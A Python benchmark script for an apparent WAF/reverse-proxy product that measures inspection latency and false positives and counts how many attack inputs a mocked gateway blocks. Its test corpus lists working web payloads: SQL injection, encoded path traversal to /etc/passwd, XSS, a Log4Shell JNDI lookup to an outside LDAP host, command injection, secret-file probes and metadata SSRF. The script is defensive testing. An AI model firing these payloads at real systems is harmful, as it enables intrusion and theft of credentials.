"""
SentinelAI - Inline Proxy Overhead & WAF Evasion Benchmark
=========================================================
Measures end-to-end ASGI inspection latency (mean, p50, p95, p99), throughput,
false-positive rate on clean traffic, and catch rate across obfuscated attacks.
"""

import os
import statistics
import tempfile
import time

import httpx
from fastapi.testclient import TestClient

from backend.app.db.traffic_store import TrafficStore
from backend.app.main import app
from backend.app.proxy import flow_tracker as ft_module
from backend.app.proxy import gateway as gw_module
from backend.app.api import monitoring as mon_module


def run_benchmark(n_clean: int = 100):
    tmp_dir = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
    db_path = os.path.join(tmp_dir.name, "bench.db")
    store = TrafficStore(db_path=db_path)

    gw_module.traffic_store = store
    mon_module.traffic_store = store
    ft_module.flow_tracker = ft_module.ClientFlowTracker(store=store)
    ft_module.quarantine_manager = ft_module.flow_tracker.quarantine
    gw_module.flow_tracker = ft_module.flow_tracker
    gw_module.quarantine_manager = ft_module.quarantine_manager
    mon_module.quarantine_manager = ft_module.quarantine_manager

    gw_module.update_proxy_settings(shield_enabled=True, shield_mode="enforce", rewrite_html=True)

    mock_client = httpx.AsyncClient(
        transport=httpx.MockTransport(
            lambda req: httpx.Response(200, headers={"content-type": "text/html"}, text="<html><body>OK</body></html>")
        )
    )
    gw_module.set_http_client(mock_client)
    client = TestClient(app)

    # Warmup model & SQLite
    client.get("/gateway/", headers={"x-forwarded-for": "198.51.100.1"})

    # 1. Clean traffic overhead benchmark (varying clean user IPs to avoid rate limit triggering)
    clean_latencies_ms = []
    clean_fp = 0
    t_start = time.perf_counter()
    for i in range(n_clean):
        ip = f"198.51.{(i // 200) + 1}.{(i % 200) + 1}"
        t0 = time.perf_counter()
        res = client.get(f"/gateway/product/{i}", headers={"x-forwarded-for": ip})
        dt = (time.perf_counter() - t0) * 1000.0
        clean_latencies_ms.append(dt)
        if res.status_code != 200:
            clean_fp += 1
    total_clean_s = time.perf_counter() - t_start

    # 2. Adversarial & Evasion Corpus
    evasion_vectors = [
        ("SQLi Tautology", "GET", "/gateway/login?u=admin' OR '1'='1--", {}),
        ("SQLi Inline Comment", "GET", "/gateway/items?id=1 UNION/**/SELECT/**/password/**/FROM/**/users", {}),
        ("JSON Body SQLi", "POST", "/gateway/api/filter", {"json": {"search": "' OR 1=1--"}}),
        ("Double-Encoded Traversal", "GET", "/gateway/dl?f=%252e%252e%252f%252e%252e%252fetc/passwd", {}),
        ("HTML-Entity XSS", "GET", "/gateway/s?q=%26%23x3c%3Bscript%26%23x3e%3Balert(1)%26%23x3c%3B%2Fscript%26%23x3e%3B", {}),
        ("Log4Shell JNDI", "GET", "/gateway/api?v=${jndi:ldap://198.51.100.9/a}", {}),
        ("Command Injection", "GET", "/gateway/ping?host=8.8.8.8;whoami", {}),
        ("Sensitive .env Probe", "GET", "/gateway/.env", {}),
        ("Exposed .git Config", "GET", "/gateway/.git/config", {}),
        ("Cloud Metadata SSRF", "GET", "/gateway/proxy?u=http://169.254.169.254/latest/meta-data", {}),
    ]
    blocked = 0
    for idx, (label, method, url, kw) in enumerate(evasion_vectors):
        ip = f"203.0.113.{idx + 10}"
        res = client.request(method, url, headers={"x-forwarded-for": ip}, **kw)
        if res.status_code == 403:
            blocked += 1

    # Add scanner bot test
    res_scan = client.get("/gateway/", headers={"x-forwarded-for": "203.0.113.90", "user-agent": "nikto/2.1.6"})
    if res_scan.status_code == 403:
        blocked += 1
    total_vectors = len(evasion_vectors) + 1

    lat_sorted = sorted(clean_latencies_ms)
    p50 = statistics.median(lat_sorted)
    p95 = lat_sorted[int(0.95 * len(lat_sorted))]
    mean_ms = statistics.mean(lat_sorted)
    rps = n_clean / total_clean_s

    print("=== SENTINELAI REVERSE PROXY BENCHMARK ===")
    print(f"Clean Requests Evaluated : {n_clean}")
    print(f"Clean False Positives    : {clean_fp} ({(clean_fp / n_clean) * 100:.2f}%)")
    print(f"Inline Latency Mean      : {mean_ms:.2f} ms")
    print(f"Inline Latency P50       : {p50:.2f} ms")
    print(f"Inline Latency P95       : {p95:.2f} ms")
    print(f"End-to-End Throughput    : {rps:.1f} req/s (single process ASGI)")
    print(f"Evasion Vectors Blocked  : {blocked}/{total_vectors} ({(blocked / total_vectors) * 100:.1f}%)")

    gw_module.set_http_client(None)
    tmp_dir.cleanup()


if __name__ == "__main__":
    run_benchmark()
